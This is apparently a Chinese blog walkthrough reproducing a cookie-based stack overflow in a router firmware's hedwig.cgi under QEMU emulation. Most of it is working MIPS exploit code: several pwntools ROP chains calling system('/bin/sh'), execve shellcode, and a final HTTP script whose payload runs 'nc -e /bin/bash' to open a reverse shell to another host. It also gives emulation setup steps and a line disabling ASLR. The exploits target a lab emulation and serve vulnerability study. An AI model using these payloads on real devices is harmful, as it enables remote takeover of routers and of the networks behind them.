<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211500301.png" alt="image-20230521150004230"></p>
<p>如果要搜将栈地址放入某个寄存器的 <code>gadget</code> ，可以用 <code>mipsrop.stackfinder()</code> 命令（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211502965.png" alt="image-20230521150247898"></p>
<p><a href="https://bbs.kanxue.com/thread-272318.htm">winmt</a> 师傅提到 用户模式不支持多线程，而 <code>system</code> 函数会调用 <code>fork</code> 函数，从而导致 <code>fork</code> 执行失败，<code>system</code> 执行到这里后就会卡住。不过之后在系统模式下是没问题的</p>
<h6 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc_base=<span class="number">0x3ff38000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x4E0EC =&gt; move $a0,$s1 ; jalr $s0</span></span><br><span class="line"><span class="comment">#0x42f60 =&gt; addiu $a0,$sp,0x18 ;  jalr  $a0 </span></span><br><span class="line"><span class="comment">#0x4683C =&gt; move $a0,$s1  ;  jalr  $s3</span></span><br><span class="line"><span class="comment">#0xB814  =&gt; addiu $a1,$sp,0x18  ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#0xDEF0  =&gt; addiu $s2,$sp,0x10 ;  jalr  $s4 </span></span><br><span class="line"><span class="comment">#0x3F25C =&gt; jalr $s2</span></span><br><span class="line"><span class="comment">#0x158c8 =&gt; adddiu $s0,1  ; jalr $s5</span></span><br><span class="line"><span class="comment">#0x159cc =&gt; addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0</span></span><br><span class="line"></span><br><span class="line">sys_addr=libc_base+<span class="number">0x53200</span></span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">1007</span></span><br><span class="line"></span><br><span class="line">payload+=p32(sys_addr-<span class="number">1</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x159cc</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x158c8</span>)</span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&quot;/bin//sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211521976.png" alt="image-20230521152152411" style="zoom:50%;" />

<p>上面的 <code>exp</code> 是可以正常走到 <code>system</code> 函数的，但是 <code>a0</code> 是 <code>/bin//sh/postxml</code> ，这是因为第一次 <code>sprintf</code> 拼接了后面的字符串常量 <code>postxml</code> 。因为地址固定的原因，我们可以直接使用 <code>libc</code> 中的 <code>/bin/sh</code> 地址 EXP如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x3ff38000</span></span><br><span class="line">sys_addr=libc_base+<span class="number">0x53200</span></span><br><span class="line">bin_sh_addr=libc_base+<span class="number">0x5a448</span></span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">1007</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x4E0EC =&gt; move $a0,$s1 ; jalr $s0</span></span><br><span class="line"><span class="comment">#0x42f60 =&gt; addiu $a0,$sp,0x18 ;  jalr  $a0 </span></span><br><span class="line"><span class="comment">#0x4683C =&gt; move $a0,$s1  ;  jalr  $s3</span></span><br><span class="line"><span class="comment">#0xB814  =&gt; addiu $a1,$sp,0x18  ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#0xDEF0  =&gt; addiu $s2,$sp,0x10 ;  jalr  $s4 </span></span><br><span class="line"><span class="comment">#0x3F25C =&gt; jalr $s2</span></span><br><span class="line"><span class="comment">#0x158c8 =&gt; adddiu $s0,1  ; jalr $s5</span></span><br><span class="line"><span class="comment">#0x159cc =&gt; addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0</span></span><br><span class="line"></span><br><span class="line">payload+=p32(sys_addr-<span class="number">1</span>)<span class="comment">#$s0</span></span><br><span class="line">payload+=p32(bin_sh_addr)<span class="comment">#$s1</span></span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x4e0ec</span>)<span class="comment">#$s5</span></span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x158c8</span>)<span class="comment">#$ra</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&quot;/bin/sh;deadbeef;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211526368.png" alt="image-20230521152651843" style="zoom: 50%;" />

<p>可以发现这次是成功执行到了 <code>system(&quot;/bin/sh&quot;)</code> ，因为 <code>fork</code> 的原因，依然是拿不到 <code>shell</code></p>
<h5 id="ROP-ret2shellcode"><a href="#ROP-ret2shellcode" class="headerlink" title="ROP-ret2shellcode"></a>ROP-ret2shellcode</h5><p>明白了上面 <code>ROP</code> 的思想，那么布置 <code>shellcode</code> 也就不在话下，因为 <code>shellcode</code> 能直接调用 <code>execve</code> 从而不需要去使用 <code>fork</code>。不过需要注意的是 <code>shellcode</code> 中不能出现 <code>\x00</code> 还有缓存不一致性（数据缓存区和指令缓存区需要一个时间来同步），因此需要先调用一下 <code>sleep(1)</code> 再去执行 <code>shellcode</code>。</p>
<p>这里还需要提到一点，如果现在执行了 <code>gadgetA</code> ，然后跳转到了 <code>sleep(1)</code> 函数，等函数返回时会再跳转到了 <code>gadgetA</code>，因此必须要保证 <code>gadgetA</code> 回来后依然能去跳转到我们指定的地址，以此来保证 <code>ROP</code> 不间断。</p>
<p>画了个抽象的图（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305240902843.png" alt="image-20230524090213648" style="zoom: 67%;" />

<h6 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h6><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc_base=<span class="number">0x3ff38000</span></span><br><span class="line">sys_addr=libc_base+<span class="number">0x53200</span></span><br><span class="line">bin_sh_addr=libc_base+<span class="number">0x5a448</span></span><br><span class="line">sleep=libc_base+<span class="number">0x56bd0</span></span><br><span class="line">payload=<span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;c&#x27;</span>*(<span class="number">1007</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x4E0EC =&gt; move $a0,$s1 ; jalr $s0</span></span><br><span class="line"><span class="comment">#0x42f60 =&gt; addiu $a0,$sp,0x18 ;  jalr  $a0 </span></span><br><span class="line"><span class="comment">#0x4683C =&gt; move $a0,$s1  ;  jalr  $s3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0xB814  =&gt; addiu $a1,$sp,0x18  ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="comment">#0xDEF0  =&gt; addiu $s2,$sp,0x10 ;  jalr  $s4 </span></span><br><span class="line"><span class="comment">#0x436D0 =&gt; move $t9,$s3 ; jalr $t9</span></span><br><span class="line"><span class="comment">#0x3F25C =&gt; jalr $s2</span></span><br><span class="line"><span class="comment">#0x57E50 =&gt; li $a0,1 ;  jalr  $s1 </span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="comment">#0x158c8 =&gt; adddiu $s0,1  ; jalr $s5</span></span><br><span class="line"><span class="comment">#0x159cc =&gt; addiu $s5,$sp,0x10 ; move $a1,$a5 ;jalr $s0</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">    li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">    sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">    li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">    sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">    sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">    la $a0, -12($sp)</span></span><br><span class="line"><span class="string">    slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#$s0</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x436d0</span>)<span class="comment">#$s1</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#$s2</span></span><br><span class="line">payload+=p32(sleep)<span class="comment">#$s3</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x3f25c</span>)<span class="comment">#$s4</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)<span class="comment">#$s5</span></span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x57e50</span>)<span class="comment">#$ra</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">10</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x3f25c</span>)<span class="comment">#$s4</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0xdef0</span>)<span class="comment">#second return address $ra</span></span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)*<span class="number">4</span></span><br><span class="line">payload+=shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211617086.png" alt="image-20230521161702923"></p>
<p>可以看到这次是拿到 <code>shell</code> 了。不过这里执行 <code>execve(&quot;/bin/sh&quot;)</code> 成功其实是一种假象，因为固件中的 <code>/bin/sh</code> 链接到了 <code>busybox</code> 上，虽然 <code>busybox</code> 是静态链接，但因为它是 <code>MIPS</code> 架构，导致了我在 <code>x64</code> 上直接执行是失败的。因此我上面是把原本的 <code>sh</code> 给删掉，换成了主机自带的 <code>x64</code> 架构的 <code>sh</code> ，同时还把相应的动态库都放到了当前的 <code>/lib</code> 下面，才算执行成功。不然用原本的 <code>sh</code> 还是执行失败，这么做的目的仅仅是为了证明这种操作理论上是可以拿到 <code>shell</code> 的 😎</p>
<h3 id="qemu-系统模式下复现"><a href="#qemu-系统模式下复现" class="headerlink" title="qemu 系统模式下复现"></a><code>qemu</code> 系统模式下复现</h3><p>只要在 <code>qemu</code> 用户模式下能复现成功，并且搞清楚原理，其实这个 <code>qemu</code> 系统模式搞的很快。首先实现一下 <code>qemu</code> 与宿主机的通信，然后把 <code>httpd</code> 服务启起来就可以发送数据包直接打了（在不遇到什么奇怪的报错下确实比较快…）</p>
<p>我这里的环境是 <code>ubuntu 18.04</code> <code>qemu-system-mipsel 7.2.0</code> </p>
<h4 id="实现宿主机与-qemu-的通信"><a href="#实现宿主机与-qemu-的通信" class="headerlink" title="实现宿主机与 qemu 的通信"></a>实现宿主机与 <code>qemu</code> 的通信</h4><p>创建一个 <code>net.sh</code> 脚本，我这里的网卡是 <code>ens33</code> ，如果是 <code>eth0</code>  的话，就把出现的 <code>ens33</code> 换成 <code>eth0</code> 即可，<code>chmod +x net.sh</code> 给文件可执行权限，然后 <code>./net.sh</code> 运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo ifconfig eth0 down                 <span class="comment"># 首先关闭宿主机网卡接口</span></span></span><br><span class="line">sudo brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 ens33                # 在 br0 中添加一个接口</span><br><span class="line">sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">sudo brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    # 启用网卡接口</span><br><span class="line">sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0                   # 查看 br0 的各接口信息</span><br></pre></td></tr></table></figure>



<p>然后再执行如下几条命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>



<p>再用下面这个脚本启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure>

<p>这个 <code>mips</code> 内核还有镜像文件，之前师傅们上放的链接好像都失效了。这里是找 <strong>winmt</strong> 师傅要的一份，上传到网盘上了  链接：<a href="https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v">https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v</a><br>提取码：l04v</p>
<p>如果此时 <code>qemu</code> 中的网卡 <code>eth0</code> 是有 <code>ip</code> 的，并且能够 <code>ping</code> 通宿主机的 <code>ip</code>，那就能说明 <code>qemu</code> 已经能和宿主机进行通信了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305212333766.png" alt="image-20230521233355276"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305212334427.png" alt="image-20230521233441258"></p>
<h4 id="启动-httpd-服务"><a href="#启动-httpd-服务" class="headerlink" title="启动 httpd 服务"></a>启动 <code>httpd</code> 服务</h4><p>在 <code>squashfs-root</code> 的上一级目录中，执行下面的命令， <code>IP</code> 换成 <code>qemu</code> 的。这样可以实现计算机远程之间的文件传输，作用就是把提取出来的文件系统传到 <code>qemu</code> 里面</p>
<p><code>sudo  scp -r ./squashfs-root root@10.214.140.139:/root/squashfs-root</code></p>
<p>然后在 <code>qemu</code> 中的 <code>squashfs-root</code> 目录下新建一个 <code>http_conf</code> 文件</p>
<p>写入以下代码（网卡和 <code>IP</code> <code>port</code> 要改成自己的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  #开启log</span><br><span class="line">ErrorLog /log #log文件</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0  #对应qemu仿真路由器系统的网卡</span><br><span class="line">    Address 10.214.140.139 #qemu仿真路由器系统的IP</span><br><span class="line">    Port &quot;80&quot; #对应未被使用的端口</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>然后在物理机上 <code>/opt/tools/mipsel</code> 目录（没有的话就自己创建吧）中新建 <code>init.sh</code> 文件，写入如下配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>给这个 <code>init.sh</code> ，可执行权限，然后将其执行</p>
<p>然后在 <code>qemu</code> 中的 <code>squashfs-root</code> 目录下创建 <code>init.sh</code> 文件，写入下面的内容。给可执行权限，然后执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">cp http_conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">mkdir /etc_bak</span><br><span class="line">cp -r /etc /etc_bak</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line">cd /</span><br><span class="line">rm -rf /htdocs/web/hedwig.cgi</span><br><span class="line">rm -rf /usr/sbin/phpcgi</span><br><span class="line">rm -rf /usr/sbin/hnap</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure>



<p>最后进到 <code>/squashfs-root/sbin</code> 目录下，执行 <code>./httpd -f /root/squashfs-root/http_conf</code></p>
<p>在宿主机中访问 <code>http://10.214.140.139/hedwig.cgi</code> 发现可以正常访问了（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305220922344.png" alt="image-20230522092237155"></p>
<p>开启 <code>httpd</code> 服务后，如果要进行调试则需要下载一个 <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">gdbserver.mipsle</a> ，然后再用 <code>scp</code> 命令将其上传到 <code>qemu</code> 中的 <code>/root/squashfs-root/</code> 目录下。</p>
<p>在 <code>qemu</code> 中 <code>/root/squashfs-root/</code> 目录下新建 <code>run.sh</code> 脚本（<code>IP</code> 改成宿主机的，端口）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;2333&quot;</span><br><span class="line">echo &quot;winmt=pwner&quot;|./gdbserver.mipsle 10.214.140.140:7788 /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;winmt=pwner&quot;</span>|/htdocs/web/hedwig.cgi</span></span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure>

<p>正常情况下应该是能从宿主机中调试 <code>qemu</code> 中的程序，但我这里报了这个错误（折腾了很久也没有解决，于是就暂时放弃了远程调试的想法）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221824553.png" alt="image-20230522182439980" style="zoom:50%;" />



<p>不过还有一个方法也能确定 <code>libc</code> 基地址，就是用运行 <code>hedwig.cgi</code> 后进行后台挂起，然后用 <code>cat /proc/pid/maps</code> 查看，先跑几次程序，发现 <code>pid</code> 的增长是有规律的，于是提前预测一下，多尝试几次就能打印出来内存布局获取 <code>libc</code> 基地址（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221542829.png" alt="image-20230522154245358"></p>
<p>因为没法调试，这里就直接用网上师傅的脚本打了（主要用户模式已经写了好几种脚本，这个没法调试的问题死活解决不了，导致了没法调试 <code>rop</code>的布局）思路和用户模式 <code>ROP-system</code> 的那个脚本是一样的，就把命令换成反弹 <code>shell</code> 的命令即可</p>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload</span>(<span class="params">offset, libc_base, cmd</span>):</span><br><span class="line">    Calcsystem = <span class="number">0x158c8</span>    <span class="comment"># $s0 add 1, jalr $s5</span></span><br><span class="line">    Callsystem = <span class="number">0x159cc</span>    <span class="comment"># &#x27;/bin/sh&#x27; -&gt; $a0, jalr system</span></span><br><span class="line">    system_addr_1 = <span class="number">0x53200</span> - <span class="number">1</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * offset  <span class="comment"># 973</span></span><br><span class="line">    payload += p32(libc_base + system_addr_1)  <span class="comment"># s0     977</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s1     981</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s2     985</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s3     989</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s4     993</span></span><br><span class="line">    payload += p32(libc_base + Callsystem)     <span class="comment"># s5     997</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s6     1001</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s7     1005</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># fp     1009</span></span><br><span class="line">    payload += p32(libc_base + Calcsystem)     <span class="comment"># ra</span></span><br><span class="line">    payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">    payload += cmd</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">b&quot;nc -e /bin/bash 10.214.140.144 7788&quot;</span></span><br><span class="line">    cookie = <span class="string">b&#x27;uid=&#x27;</span> + get_payload(<span class="number">973</span>, <span class="number">0x2aaf8000</span>, cmd)</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;100&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;x&#x27;</span>&#125;</span><br><span class="line">    ip_port = sys.argv[<span class="number">1</span>]</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + ip_port + <span class="string">&quot;/hedwig.cgi&quot;</span></span><br><span class="line">    r = requests.post(url=url, headers=header, data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>可以看到是已经将 <code>qemu</code> 中模拟的环境 <code>shell</code> 反弹到了宿主机上。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221606264.png" alt="image-20230522160633923"></p>
